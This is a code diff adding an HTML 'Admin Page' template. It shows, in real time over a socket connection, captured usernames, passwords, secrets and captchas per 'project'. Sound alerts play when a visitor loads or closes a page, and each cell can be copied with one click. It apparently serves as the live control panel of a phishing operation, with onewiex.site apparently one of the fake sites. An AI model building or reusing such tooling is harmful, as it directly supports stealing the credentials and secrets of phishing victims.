@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Admin Page</title>
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="{{ url_for('static', filename='favicon.ico') }}"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.2/socket.io.js"></script>
+    <style>
+      #data-container {
+        width: 100%;
+        border-collapse: collapse;
+      }
+      #data-container th,
+      #data-container td {
+        border: 1px solid #ddd;
+        padding: 8px;
+        cursor: pointer;
+      }
+      #data-container th {
+        background-color: #f2f2f2;
+      }
+      #data-container tr:hover {
+        background-color: #f2f2f2;
+      }
+      #data-container td:hover {
+        background-color: #e0e0e0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Admin Page</h1>
+    <table id="data-container">
+      <thead>
+        <tr>
+          <th>Timestamp</th>
+          <th>Event</th>
+          <th>Project</th>
+          <th>Username</th>
+          <th>Password</th>
+          <th>Secret</th>
+          <th>Captcha</th>
+          <th>Href</th>
+        </tr>
+      </thead>
+      <!-- can not delete tbody -->
+      <tbody></tbody>
+    </table>
+
+    <script>
+      const token = localStorage.getItem('token');
+
+      if (!token) {
+        window.location.href = '/';
+      } else {
+        fetch(`/authenticate`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            Authorization: `Bearer ${token}`,
+          },
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.message === 'Token is valid') {
+              console.log('Access granted');
+            } else {
+              window.location.href = '/';
+            }
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+            window.location.href = '/';
+          });
+      }
+
+      function addRowToTable(data) {
+        const tbody = document.querySelector('#data-container tbody');
+
+        const {
+          timestamp,
+          project,
+          username,
+          password,
+          secret,
+          event,
+          captcha,
+          href,
+        } = data;
+
+        const newRow = document.createElement('tr');
+        const timestampCell = document.createElement('td');
+        const projectCell = document.createElement('td');
+        const usernameCell = document.createElement('td');
+        const passwordCell = document.createElement('td');
+        const secretCell = document.createElement('td');
+        const eventCell = document.createElement('td');
+        const captchaCell = document.createElement('td');
+        const hrefCell = document.createElement('td');
+
+        timestampCell.innerText = timestamp;
+        projectCell.innerText = project;
+        usernameCell.innerText = username;
+        passwordCell.innerText = password;
+        secretCell.innerText = secret;
+        eventCell.innerText = event;
+        captchaCell.innerText = captcha;
+        hrefCell.innerText = href;
+
+        newRow.appendChild(timestampCell);
+        newRow.appendChild(eventCell);
+        newRow.appendChild(projectCell);
+        newRow.appendChild(usernameCell);
+        newRow.appendChild(passwordCell);
+        newRow.appendChild(secretCell);
+        newRow.appendChild(captchaCell);
+        newRow.appendChild(hrefCell);
+
+        if (event === 'window_loaded') {
+          newRow.style.backgroundColor = 'lightblue';
+        } else if (event === 'window_closed') {
+          newRow.style.backgroundColor = 'lightcoral';
+        }
+
+        // Add the new row to the top of the table
+        tbody.insertBefore(newRow, tbody.firstChild);
+
+        if (project != 'https://onewiex.site/') {
+          playSound(event);
+        }
+      }
+
+      const dataContainer = document.getElementById('data-container');
+      if (dataContainer) {
+        dataContainer.addEventListener('click', (event) => {
+          const targetCell = event.target;
+          if (targetCell.tagName === 'TD') {
+            copyToClipboard(targetCell.innerText);
+          }
+        });
+      }
+
+      function playSound(event) {
+        var audio;
+        switch (event) {
+          case 'window_loaded':
+            audio = new Audio('static/notification.mp3');
+            break;
+          case 'window_closed':
+            audio = new Audio('static/leave.mp3');
+            break;
+          default:
+            audio = new Audio('static/message.mp3');
+            break;
+        }
+        audio.play().catch((error) => {
+          console.error('Autoplay blocked:', error);
+        });
+      }
+
+      function copyToClipboard(text) {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+      }
+
+      let reconnectAttempts = 0;
+      const maxReconnectAttempts = 5;
+      const reconnectDelay = 1000;
+
+      function connectSocket() {
+        const socket = io();
+
+        socket.on('connect', () => {
+          console.log('Connected to backend server.');
+        });
+
+        socket.on('emit_event', (data) => {
+          addRowToTable(data);
+        });
+
+        socket.on('disconnect', (reason) => {
+          console.log('Socket disconnected:', reason);
+          if (reconnectAttempts < maxReconnectAttempts) {
+            const nextReconnectDelay =
+              reconnectDelay * Math.pow(2, reconnectAttempts);
+            reconnectAttempts++;
+
+            console.log(
+              'Attempting to reconnect in',
+              nextReconnectDelay,
+              'ms...'
+            );
+
+            setTimeout(() => {
+              socket.connect();
+            }, nextReconnectDelay);
+          } else {
+            console.log(
+              'Exceeded maximum reconnect attempts. Stopping reconnect attempts.'
+            );
+          }
+        });
+
+        socket.connect();
+      }
+
+      connectSocket();
+    </script>
+  </body>
+</html>
